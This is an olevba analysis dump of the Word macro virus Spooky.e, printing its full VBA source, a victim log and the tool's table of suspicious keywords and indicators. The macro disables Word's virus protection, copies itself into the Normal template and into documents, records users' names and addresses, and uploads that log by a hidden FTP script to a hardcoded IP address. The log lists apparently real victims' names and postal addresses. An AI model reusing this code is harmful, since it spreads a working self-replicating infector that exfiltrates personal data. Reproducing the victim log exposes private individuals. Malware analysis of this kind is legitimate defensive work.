olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Spooky.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Spooky.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim AD, NT As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 04:38:36  - Wednesday, 3 Feb 1999
' Lisa Macbeth
'



' 03:39:47  - Monday, 8 Feb 1999
' DTIR
'



' 01:56:06  - Friday, 12 Feb 1999
' Clare Keating
' Clare Keating
' 67 Carmel Street
' Bardon   Q  4065



' 08:27:56  - Tuesday, 16 Feb 1999
' SUPERVISOR
'



' 08:52:51 am - Friday, 19 Feb 1999
' sasawt
'



' 04:49:16  - Monday, 22 Feb 1999
' metcalfe
'



' 09:45:33  - Sunday, 28 Feb 1999
' Brian Vandersee
'



' 10:00:47  - Tuesday, 2 Mar 1999
' mertens
'



' 02:32:20  - Sunday, 7 Mar 1999
' David Freebairn
' PO Box 318
' Toowoomba Qld 4350
' Australia



' 08:31:23  - Friday, 12 Mar 1999
' Kep Coughlan
'



' 11:16:17  - Monday, 22 Mar 1999
' Ian Bevage
'



' 03:10:11 PM - Tuesday, 23 Mar 1999
' fadzlon
'



' 08:39:09 AM - Wednesday, 24 Mar 1999
' fadzlon
'



' 04:18:29 PM - Wednesday, 31 Mar 1999
' Win95
' Dr. Emmanuel D. Bello
' Director
' Forest Products Research and Development Institute
' College, Laguna  4031
' PHILIPPINES



' 03:44:57 PM - Friday, 16 Apr 1999
' Khoo
'



' 12:43:59  - Tuesday, 4 May 1999
' khookc
' K.C. Khoo
' 57, Jln SS 21/13
' 47400 Petaling Jaya



' 09:18:27 AM - Tuesday, 11 May 1999
' SAIFUL HAZLIN
'



' 06:46:42 PM - Friday, 21 May 1999
' MOHD YUSOF ABDULLAH
'



' 04:04:20 PM - Monday, 7 Jun 1999
' user
'



' 07:58:28  - Tuesday, 9 Jun 2099
' MPP
'



' 03:16:45 PM - Friday, 12 Nov 1993
' IZAM BIN MD ARIS
'



' 12:13:57  - Friday, 9 Jul 1999
' user
'



' 02:38:51 PM - Saturday, 8 Apr 2000
' itbase
' IT-Base
' No. 3538, Jalan 18/46,
' Tmn. Sri Serdang, 43300 Seri Kembangan
' SELANGOR DE.



' 03:06:58 PM - Monday, 24 Apr 2000
' trainee
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

